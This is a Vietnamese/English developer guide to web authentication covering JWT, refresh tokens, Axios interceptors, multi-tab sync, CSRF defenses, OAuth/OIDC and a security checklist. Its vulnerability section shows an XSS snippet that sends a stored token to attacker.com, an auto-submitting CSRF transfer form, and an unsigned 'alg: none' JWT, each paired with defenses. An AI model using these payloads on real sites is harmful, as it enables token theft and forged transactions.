# Authentication – Complete Guide (Explanation-first, Production-ready)

---

## 0. Authentication vs Authorization (Phải hiểu đúng từ đầu)

### Authentication là gì?

**Authentication = Xác thực danh tính**
Trả lời câu hỏi: **“Bạn là ai?”**

Ví dụ:

* Login bằng email/password
* Login bằng Google / GitHub
* Login bằng SSO công ty

👉 Kết quả của authentication:

```
Server biết chắc request này đến từ user nào
```

---

### Authorization là gì?

**Authorization = Phân quyền**
Trả lời câu hỏi: **“Bạn được phép làm gì?”**

Ví dụ:

* User thường không vào được admin page
* User chỉ sửa được data của chính mình

---

### Mental model dễ nhớ

```
Authentication → Identity (Danh tính)
Authorization  → Power (Quyền lực)
```

Ví dụ ngoài đời:

* Authentication = Xuất trình CCCD ở sân bay
* Authorization = Vé economy hay business class

⚠️ Lưu ý quan trọng:

> User **có thể đã authenticated nhưng vẫn bị unauthorized** (403)

---

## 1. Vấn đề cốt lõi mà Authentication giải quyết

### Vì sao authentication tồn tại?

* HTTP là **stateless**
* Mỗi request độc lập, server không nhớ request trước

👉 Câu hỏi gốc:

> “Làm sao server biết request này là của user đã login trước đó?”

---

### Ý tưởng chung của mọi cơ chế authentication

Dù là **session**, **JWT** hay **OAuth**, bản chất đều giống nhau:

```
1. User chứng minh danh tính (login)
2. Server xác thực thành công
3. Server cấp một "bằng chứng" (credential)
4. Client gửi bằng chứng đó ở các request sau
5. Server kiểm tra bằng chứng → xác định user
```

Khác nhau nằm ở:

* Bằng chứng đó là gì?
* Server có lưu state hay không?
* Mức độ bảo mật & khả năng scale

---

## 2. JWT (JSON Web Token)

### JWT là gì?

**JWT = token tự chứa thông tin user, được server ký (signed)**

Mental model:

> JWT giống như **hộ chiếu điện tử**

* Header: Loại token + thuật toán ký
* Payload: Thông tin user (claims)
* Signature: Chữ ký chống giả mạo

⚠️ Quan trọng:

> JWT **được encode, KHÔNG được encrypt** → ai cũng decode được payload

---

### JWT giải quyết vấn đề gì?

* Server **không cần lưu session**
* Bất kỳ server nào có secret/public key đều verify được token

👉 JWT phù hợp khi:

* Hệ thống cần scale ngang
* SPA / Mobile app
* Microservices

---

### JWT KHÔNG giải quyết vấn đề gì?

* Không revoke được token ngay lập tức
* Token bị leak → hợp lệ cho đến khi hết hạn

👉 Vì vậy JWT **luôn phải đi kèm expiration + refresh strategy**

---

## 3. Token Storage – Vì sao chọn chỗ này mà không phải chỗ khác?

### Các lựa chọn phổ biến

| Storage           | Bản chất            | Đánh giá              |
| ----------------- | ------------------- | --------------------- |
| localStorage      | JS access được      | ❌ Không an toàn (XSS) |
| sessionStorage    | JS access, theo tab | ❌ Vẫn XSS             |
| Memory (JS state) | Không persist       | ✅ An toàn, UX kém     |
| HttpOnly Cookie   | JS không đọc được   | ✅ **Recommended**     |

---

### Vì sao HttpOnly Cookie là best practice?

* JavaScript **không thể đọc** → chống XSS token theft
* Browser tự gửi cookie
* Kết hợp `Secure + SameSite` giảm CSRF

Trade-off:

* Setup phức tạp hơn
* Phải xử lý CORS cẩn thận

---

## 4. Token Lifetime & Refresh Strategy

### Bài toán cốt lõi

```
Token ngắn → An toàn nhưng UX kém
Token dài  → UX tốt nhưng rủi ro cao
```

👉 Không có "one-token" giải quyết được bài toán này

---

### Giải pháp chuẩn: Access Token + Refresh Token

**Access Token**

* Ngắn hạn (5–15 phút)
* Dùng cho API

**Refresh Token**

* Dài hạn (7–30 ngày)
* Chỉ dùng để lấy access token mới
* Lưu trong HttpOnly cookie

Mental model:

> Access token = Vé vào cửa tạm thời
> Refresh token = Thẻ gia hạn vé

---

### Refresh Token Rotation (Production-grade)

Mỗi lần refresh:

* Token cũ bị invalidate
* Token mới được cấp

Lợi ích:

* Phát hiện reuse (token bị đánh cắp)
* Có thể logout toàn bộ session

---

## 4.1 Frontend Implementation Patterns

### Pattern 1: Axios Interceptor với Request Queueing

**Problem:**
Khi access token hết hạn, nhiều requests đồng thời fail → tất cả đều trigger refresh → race condition.

**Solution: Queue requests during refresh**

```javascript
import axios from 'axios';

let isRefreshing = false;
let failedQueue = [];

const processQueue = (error, token = null) => {
  failedQueue.forEach(prom => {
    if (error) {
      prom.reject(error);
    } else {
      prom.resolve(token);
    }
  });
  
  failedQueue = [];
};

// Response interceptor
axios.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;
    
    // Token expired
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // Queue request - đợi refresh xong
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        })
          .then(() => axios(originalRequest))
          .catch(err => Promise.reject(err));
      }
      
      originalRequest._retry = true;
      isRefreshing = true;
      
      try {
        // Chỉ 1 request refresh, còn lại queue
        await refreshAccessToken(); // Call refresh endpoint
        
        processQueue(null); // Resume queued requests
        return axios(originalRequest); // Retry original request
        
      } catch (refreshError) {
        processQueue(refreshError, null);
        
        // Refresh failed → logout user
        localStorage.removeItem('user');
        window.location.href = '/login';
        
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }
    
    return Promise.reject(error);
  }
);

// Refresh token function
async function refreshAccessToken() {
  const response = await axios.post('/api/auth/refresh', {}, {
    withCredentials: true // Send HttpOnly refresh token cookie
  });
  
  // New access token in response (nếu không dùng cookie)
  // localStorage.setItem('accessToken', response.data.accessToken);
  
  return response.data;
}
```

**Tại sao pattern này quan trọng:**
- Tránh refresh storm (100 requests → 100 refresh calls)
- Chỉ 1 refresh request tại 1 thời điểm
- Các requests khác queue và retry sau khi refresh xong

---

### Pattern 2: Token Expiry Edge Cases

#### Case 1: Token hết hạn giữa long operation

```javascript
// ❌ Problem: Upload file lâu, token hết giữa chừng
async function uploadLargeFile(file) {
  // Upload 30 phút
  const formData = new FormData();
  formData.append('file', file);
  
  return axios.post('/api/upload', formData); // Token có thể hết giữa chừng
}

// ✅ Solution: Ensure token fresh trước long operation
async function uploadLargeFile(file) {
  // Refresh nếu token sắp hết (< 5 phút)
  await ensureTokenFresh(5 * 60 * 1000); // 5 minutes
  
  const formData = new FormData();
  formData.append('file', file);
  
  return axios.post('/api/upload', formData, {
    // Optional: Upload progress
    onUploadProgress: (progressEvent) => {
      const percentCompleted = Math.round(
        (progressEvent.loaded * 100) / progressEvent.total
      );
      console.log(percentCompleted);
    }
  });
}

// Helper: Check token expiry
function ensureTokenFresh(bufferMs = 0) {
  const token = getAccessToken();
  if (!token) return Promise.reject('No token');
  
  // Decode JWT to check expiry (payload is base64, not encrypted)
  const payload = JSON.parse(atob(token.split('.')[1]));
  const expiry = payload.exp * 1000; // Convert to milliseconds
  const now = Date.now();
  
  // If token expires within buffer time, refresh
  if (expiry - now < bufferMs) {
    return refreshAccessToken();
  }
  
  return Promise.resolve();
}
```

---

#### Case 2: Multi-tab Synchronization

**Problem:** User mở 5 tabs:
- Tab 1 refresh token
- Tab 2, 3, 4, 5 vẫn dùng token cũ → fail

**Solution: BroadcastChannel API**

```javascript
// Tab synchronization
const authChannel = new BroadcastChannel('auth_channel');

// Tab A: Sau khi refresh token
function onTokenRefreshed(newToken) {
  // Broadcast to other tabs
  authChannel.postMessage({
    type: 'TOKEN_REFRESHED',
    timestamp: Date.now()
  });
}

// Tab B, C, D, E: Listen cho refresh events
authChannel.onmessage = (event) => {
  if (event.data.type === 'TOKEN_REFRESHED') {
    // Reload token from cookie (nếu dùng HttpOnly cookie)
    // Hoặc refetch user info
    console.log('Token refreshed in another tab');
    
    // Option 1: Reload page (simple)
    // window.location.reload();
    
    // Option 2: Refetch user/token (better UX)
    refetchCurrentUser();
  }
  
  if (event.data.type === 'LOGOUT') {
    // User logout ở tab khác
    handleLogout();
  }
};

// Broadcast logout
function handleLogout() {
  authChannel.postMessage({ type: 'LOGOUT' });
  localStorage.removeItem('user');
  window.location.href = '/login';
}

// Cleanup
window.addEventListener('beforeunload', () => {
  authChannel.close();
});
```

**Alternative: localStorage event listener (older browsers)**

```javascript
// Listen for storage changes (cross-tab)
window.addEventListener('storage', (event) => {
  if (event.key === 'logout-event') {
    // Another tab logged out
    window.location.href = '/login';
  }
  
  if (event.key === 'token-refreshed') {
    // Another tab refreshed token
    refetchCurrentUser();
  }
});

// Trigger from other tab
function broadcastLogout() {
  localStorage.setItem('logout-event', Date.now().toString());
  localStorage.removeItem('logout-event'); // Trigger phải set + remove
}
```

---

### Pattern 3: React Hook for Authentication

```javascript
import { createContext, useContext, useState, useEffect } from 'react';

const AuthContext = createContext(null);

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Check initial auth state
    checkAuth();
    
    // Setup BroadcastChannel
    const channel = new BroadcastChannel('auth_channel');
    channel.onmessage = (event) => {
      if (event.data.type === 'LOGOUT') {
        setUser(null);
      }
      if (event.data.type === 'TOKEN_REFRESHED') {
        checkAuth();
      }
    };
    
    return () => channel.close();
  }, []);

  async function checkAuth() {
    try {
      const response = await axios.get('/api/auth/me', {
        withCredentials: true
      });
      setUser(response.data);
    } catch (error) {
      setUser(null);
    } finally {
      setLoading(false);
    }
  }

  async function login(email, password) {
    const response = await axios.post('/api/auth/login', {
      email,
      password
    }, {
      withCredentials: true
    });
    
    setUser(response.data.user);
    return response.data;
  }

  async function logout() {
    await axios.post('/api/auth/logout', {}, {
      withCredentials: true
    });
    
    setUser(null);
    
    // Broadcast to other tabs
    const channel = new BroadcastChannel('auth_channel');
    channel.postMessage({ type: 'LOGOUT' });
    channel.close();
  }

  const value = {
    user,
    loading,
    login,
    logout,
    checkAuth
  };

  return (
    <AuthContext.Provider value={value}>
      {children}
    </AuthContext.Provider>
  );
}

// Custom hook
export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) {
    throw new Error('useAuth must be used within AuthProvider');
  }
  return context;
}

// Usage
function LoginPage() {
  const { login } = useAuth();
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    await login(email, password);
    navigate('/dashboard');
  };
}

function ProtectedRoute({ children }) {
  const { user, loading } = useAuth();
  
  if (loading) return <Spinner />;
  if (!user) return <Navigate to="/login" />;
  
  return children;
}
```

---

## 4.2 CSRF Protection khi dùng Cookie

### Vấn đề với HttpOnly Cookie

HttpOnly Cookie tự động gửi → **CSRF attack possible**

**CSRF (Cross-Site Request Forgery):**
```
User đã login vào bank.com
User mở tab mới, vào evil.com

evil.com chứa:
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker-account">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>

→ Browser tự động gửi cookie của bank.com
→ Transfer thành công nếu không có CSRF protection
```

---

### Solution 1: SameSite Cookie Attribute (Recommended)

**Backend response:**
```http
Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Lax
```

**SameSite values:**

| Value | Behavior | Use case |
|-------|----------|----------|
| `Strict` | Cookie không gửi cross-site | Highest security, UX kém (link từ email → not logged in) |
| `Lax` | Cookie gửi cho top-level navigation (GET) | **Recommended** - Balance security + UX |
| `None` | Cookie gửi mọi cross-site request | Phải có `Secure` (HTTPS), dùng khi cần embed iframe |

**Rule of thumb:**
```
SameSite=Lax đủ cho 95% cases
```

---

### Solution 2: Double Submit Cookie Pattern

**Flow:**
```
1. Backend set 2 cookies:
   - auth_token (HttpOnly)
   - csrf_token (NOT HttpOnly - JS đọc được)

2. Frontend đọc csrf_token từ cookie
3. Gửi csrf_token trong header
4. Backend verify 2 values match
```

**Implementation:**

```javascript
// Backend (Express.js)
app.post('/api/auth/login', (req, res) => {
  // After successful login
  const csrfToken = generateRandomToken();
  
  res.cookie('auth_token', jwt, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax'
  });
  
  res.cookie('csrf_token', csrfToken, {
    httpOnly: false, // JS can read
    secure: true,
    sameSite: 'lax'
  });
  
  res.json({ success: true });
});

// CSRF middleware
function csrfProtection(req, res, next) {
  const tokenFromCookie = req.cookies.csrf_token;
  const tokenFromHeader = req.headers['x-csrf-token'];
  
  if (!tokenFromCookie || tokenFromCookie !== tokenFromHeader) {
    return res.status(403).json({ error: 'CSRF token mismatch' });
  }
  
  next();
}

// Apply to state-changing routes
app.post('/api/*', csrfProtection, ...);
app.put('/api/*', csrfProtection, ...);
app.delete('/api/*', csrfProtection, ...);
```

```javascript
// Frontend (Axios)
function getCookie(name) {
  const value = `; ${document.cookie}`;
  const parts = value.split(`; ${name}=`);
  if (parts.length === 2) return parts.pop().split(';').shift();
}

// Setup axios interceptor
axios.interceptors.request.use(config => {
  const csrfToken = getCookie('csrf_token');
  if (csrfToken) {
    config.headers['X-CSRF-Token'] = csrfToken;
  }
  return config;
});
```

---

## 5. OAuth 2.0 & OIDC

### OAuth 2.0 là gì?

OAuth **KHÔNG phải authentication**

> OAuth = Cơ chế **ủy quyền truy cập tài nguyên**

Mental model:

> Chìa khóa valet – chỉ mở được xe, không mở cốp

---

### OIDC (OpenID Connect)

OIDC = OAuth + Authentication

OIDC bổ sung:

* ID Token (JWT)
* Thông tin identity chuẩn hóa

👉 “Login with Google” thực chất là **OIDC**

---

## 6. Session-based Authentication

### Session là gì?

* Server lưu trạng thái user
* Client chỉ giữ session ID

Ưu điểm:

* Revoke ngay lập tức
* Server kiểm soát hoàn toàn

Nhược điểm:

* Scale khó
* Sticky session

---

## 7. Khi nào dùng cái gì? (Decision Guide)

| Context             | Recommendation |
| ------------------- | -------------- |
| SPA / Mobile        | JWT + Refresh  |
| Admin nội bộ        | Session        |
| SaaS / Multi-tenant | JWT + OIDC     |
| Enterprise SSO      | OIDC           |

---

## 8. Security Best Practices & Checklist

### ✅ JWT Security Checklist

**1. Token Storage**
- ☐ **NEVER** store JWT trong `localStorage` (XSS vulnerable)
- ☐ Use HttpOnly Cookie cho refresh token
- ☐ Access token có thể ở memory (React state) nếu short-lived

**2. Token Expiration**
- ☐ Access token: 5-15 phút (không quá 1 giờ)
- ☐ Refresh token: 7-30 ngày
- ☐ Implement refresh token rotation

**3. JWT Payload**
- ☐ KHÔNG nhét sensitive data (password, credit card)
- ☐ Payload là public (base64 decode được)
- ☐ Chỉ nhét: user ID, role, expiry

**4. Token Validation**
- ☐ Verify signature (HS256/RS256)
- ☐ Check `exp` (expiration)
- ☐ Check `iss` (issuer) nếu multi-tenant
- ☐ Check `aud` (audience) nếu có

**5. Secret Management**
- ☐ JWT secret minimum 256 bits
- ☐ KHÔNG commit secret vào git
- ☐ Use environment variables
- ☐ Rotate secret định kỳ

---

### ⚠️ JWT Vulnerabilities cần biết

#### 1. None Algorithm Attack

**Attack:**
```javascript
// Attacker tạo JWT với alg: "none"
{
  "alg": "none",
  "typ": "JWT"
}
.
{
  "sub": "admin",
  "role": "admin"
}
.
// No signature
```

**Defense:**
```javascript
// Backend PHẢI reject alg: "none"
jwt.verify(token, secret, {
  algorithms: ['HS256', 'RS256'] // Whitelist allowed algorithms
});
```

---

#### 2. Key Confusion Attack (RS256 → HS256)

**Attack:**
Server dùng RS256 (public/private key)  
Attacker đổi header thành HS256, dùng public key làm secret

**Defense:**
```javascript
// KHÔNG accept multiple algorithms
jwt.verify(token, secret, {
  algorithms: ['RS256'] // ONLY RS256, không accept HS256
});
```

---

#### 3. Token Sidejacking (XSS)

**Attack:**
```javascript
// XSS inject script
<script>
  fetch('https://attacker.com?token=' + localStorage.getItem('token'));
</script>
```

**Defense:**
- HttpOnly Cookie (script không đọc được)
- Content Security Policy (CSP)
- Sanitize user input

---

### 🔒 Additional Security Measures

#### 1. Rate Limiting

```javascript
// Prevent brute force login
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 requests per window
  message: 'Too many login attempts'
});

app.post('/api/auth/login', loginLimiter, ...);
```

---

#### 2. Device Fingerprinting (Advanced)

```javascript
// Track device info để detect stolen token
const deviceFingerprint = {
  userAgent: req.headers['user-agent'],
  ip: req.ip,
  acceptLanguage: req.headers['accept-language']
};

// Store in refresh token payload
const refreshToken = jwt.sign({
  userId: user.id,
  device: hashFingerprint(deviceFingerprint)
}, refreshSecret);

// Verify on refresh
if (hashFingerprint(currentDevice) !== tokenPayload.device) {
  // Device mismatch → token stolen?
  return res.status(401).json({ error: 'Device mismatch' });
}
```

---

#### 3. Logout Strategies

**Client-side logout (không an toàn nhưng đủ cho short token):**
```javascript
function logout() {
  // Clear token
  localStorage.removeItem('token');
  // Redirect
  window.location.href = '/login';
}
```

**Server-side logout (an toàn hơn):**
```javascript
// Backend maintain blacklist
const tokenBlacklist = new Set();

app.post('/api/auth/logout', (req, res) => {
  const token = extractToken(req);
  
  // Add to blacklist
  tokenBlacklist.add(token);
  
  // Optional: Clear refresh token cookie
  res.clearCookie('refresh_token');
  
  res.json({ success: true });
});

// Verify middleware check blacklist
function verifyToken(req, res, next) {
  const token = extractToken(req);
  
  if (tokenBlacklist.has(token)) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  
  // ... verify token
}
```

**Trade-off:**
- Blacklist = stateful → giảm lợi ích của JWT
- Giải pháp: Chỉ blacklist refresh token (ít hơn access token nhiều)

---

### 📋 Pre-deployment Checklist

**Security:**
- ☐ HttpOnly + Secure + SameSite cookies
- ☐ CSRF protection (SameSite=Lax minimum)
- ☐ Short access token expiry
- ☐ Refresh token rotation
- ☐ HTTPS enforced (HSTS header)
- ☐ Rate limiting on auth endpoints
- ☐ Password hashing (bcrypt/argon2, NOT MD5/SHA1)

**Implementation:**
- ☐ Axios interceptor với request queueing
- ☐ Multi-tab synchronization
- ☐ Token expiry preemptive refresh
- ☐ Proper error handling (401 vs 403)

**Testing:**
- ☐ Test expired token flow
- ☐ Test concurrent requests during refresh
- ☐ Test cross-tab logout
- ☐ Test CSRF attack (manual or automated)

---

## 9. Những sai lầm phổ biến (Anti-patterns)

❌ **Lưu JWT trong localStorage**  
→ XSS có thể steal token

❌ **Access token quá dài hạn (> 1 giờ)**  
→ Token leak = persistent access

❌ **Không có refresh rotation**  
→ Refresh token bị steal = vĩnh viễn compromised

❌ **Tin vào frontend logout**  
→ Token vẫn valid sau "logout"

❌ **Nhét quá nhiều data vào JWT payload**  
→ Token size lớn, performance issue

❌ **Không validate JWT algorithm**  
→ None algorithm attack

❌ **Không handle 401 globally**  
→ Mỗi component tự xử lý = code duplication

❌ **Không test multi-tab scenarios**  
→ User complaints về logout không sync

---

## 10. Tổng kết ngắn gọn

### Core Concepts
* Authentication tạo **identity**, không tạo quyền
* JWT giúp scale, không giúp revoke ngay lập tức
* HttpOnly cookie là lựa chọn an toàn nhất
* Access + Refresh là pattern bắt buộc trong production
* OAuth ≠ Authentication, OIDC mới là login

### Implementation Essentials
* Axios interceptor với request queueing
* Multi-tab sync qua BroadcastChannel
* CSRF protection qua SameSite=Lax
* Token expiry preemptive refresh
* Server-side logout cho security-critical apps

### Security Rules
* Never trust frontend-only security
* Always validate on backend
* Short-lived access tokens (<15m)
* Rotate refresh tokens
* Monitor for abnormal patterns

> **Nguyên tắc vàng**:
> *Auth sai → hệ thống sớm muộn cũng bị exploit*

> **Production reality**:
> *Auth implementation khó hơn concept gấp 10 lần*

---

**DOCUMENT UPDATED ✅**

*Version: 2.0*  
*Last updated: 2026-01-03*  
*Added: Implementation patterns, CSRF protection, Security checklist*
